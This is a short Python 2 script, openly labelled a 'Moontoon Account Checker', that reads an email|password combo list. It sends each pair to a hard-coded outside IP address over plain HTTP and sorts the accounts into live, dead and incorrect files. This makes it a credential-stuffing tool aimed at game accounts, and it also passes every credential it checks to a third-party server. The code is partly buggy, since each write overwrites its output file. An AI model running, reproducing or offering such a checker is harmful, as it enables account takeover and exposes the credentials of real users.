import requests


red = "\033[1;31;40m"
green = "\033[1;32;40m"
cyan = "\033[1;36;40m"
grey = "\033[1;37;40m"

def cek(listindex,email, password):
    try:
        link = "http://95.216.186.13/montoon.php?email={}&password={}".format(str(email), str(password))
        r = requests.get(link)
        resp = r.json()
        if resp['msg'] == 'Error_Success':
            print green+'[+] Gendeng Squad Moontoon Checker - LIVE - '+ email + '|' + password
            open('live.txt', 'w').write('DIE => {}|{} \n'.format(email, password))
        elif resp['msg'] == 'Error_NoAccount':
            print red+'[+] Gendeng Squad Moontoon Checker - DIE - '+ email + '|' + password
            open('die.txt', 'w').write('DIE => {}|{} \n'.format(email, password))
        elif resp['msg'] == 'Error_PasswdError':
            print red+'[+] Gendeng Squad Moontoon Checker - ACCOUNT NOT FOUND - '+ email + '|' + password
            open('incorrect.txt', 'w').write('DIE => {}|{} \n'.format(email, password))
        else:
            pass
    except:
        pass

def kelar():
    try:
        List = len(list(open(mail)))
        Lep = len(list(open('live.txt')))
        Die = len(list(open('die.txt')))
        Unknown = len(list(open('incorrect.txt')))
        print ''
        print cyan+'================================================================'
        print cyan+'[+] Total Account Checked => {}'.format(str(List))
        print cyan+'[+] Total Account Found => {}'.format(str(Lep))
        print cyan+'[+] Total Account Die => {}'.format(str(Die))
        print cyan+'[+] Total Account Incorrect => {}'.format(str(Unknown))
        print cyan+'================================================================'
    except:
        pass

print(r"""
    _   _  _   _   ___  ___ _  ___   _____ ___ 
   /_\ | \| | /_\ | _ \/ __| || \ \ / / _ / _ \
  / _ \| .` |/ _ \|   | (__| __ |\ V /\_, \_, /
 /_/ \_|_|\_/_/ \_|_|_\\___|_||_| |_|  /_/ /_/ 
                 Moontoon Account Checker
                 john.dhoe412@gmail.com
                 https://www.facebook.com/jancoxx412    
                 
                 """)
try:
    mail = raw_input(" [+] Input your file Account list : ")
except:
    print"\n[+] File e Raonok Cok"
    print"\n[+] Cek Maneh ..."
    pass

akun = list(open(mail))
for emails in akun:
    try:
        email = emails.split('|')[0]
        password = emails.split('|')[1].replace('\n', '')
        cek(akun.index(emails), email, password)
    except:
        print '\n[+] Format list salah ...'
kelar()